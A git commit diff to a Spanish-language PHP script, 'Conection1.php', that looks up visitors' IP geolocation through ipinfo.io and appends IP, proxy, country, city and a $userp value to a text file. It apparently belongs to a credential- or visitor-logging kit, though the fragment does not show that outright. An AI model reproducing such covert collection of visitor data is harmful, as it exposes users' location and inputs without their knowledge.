423135fd8f56fd69277b8160cd10e4e537cd67ee
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-05-05 23:25:09 -0500

    Update Conection1.php

--- Conection1.php
+++ Conection1.php
@@ -13,33 +13,6 @@ $cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 
 
-$user_ip = $ip;
- 
-$url = "http://ipinfo.io/".$user_ip;
-$ip_info = json_decode(file_get_contents($url));
-$file = fopen("NEW01.txt", "a");
- 
-$ip = $ip_info->ip;
-$host = $ip_info->hostname;
-$city = $ip_info->city;
-$region = $ip_info->region;
-$country = $ip_info->country;
-$loc = $ip_info->loc;
-$loc_array = explode(',',$loc);
-$lat = $loc_array[0];
-$long = $loc_array[1];
-$org = $ip_info->org;
-$postal = $ip_info->postal;
- 
-		echo '<strong>Dirección IP   </strong>'.$ip.'<br>';
-		echo '<strong>Host Name   </strong>'.$host.'<br>';
-		echo '<strong>Ciudad    </strong>'.$ciudad.'<br>';
-		echo '<strong>Region    </strong>'.$region.'<br>';
-		echo '<strong>Codigo País  </strong>'.$pais.'<br>';
-		echo '<strong>Localización   </strong>'.'Lat'.$lat.''.'Long'.$long.'<br>';
-		echo '<strong>Org   </strong>'.$org.'<br>';
-		echo '<strong>Portal Code    </strong>'.$postal.'<br>';
-
 	
 	$file = fopen("NEW01.txt", "a");
 	
@@ -52,7 +25,6 @@ fwrite($file,
 * IP: ".$ip."
 * PROXY: ".$proxy."
 * IP COMPARTIDA: ".$ip_comp."
-* PAIS: ".$dataArray."
 ".$userp."
 ".$cc."
 ".$city."   
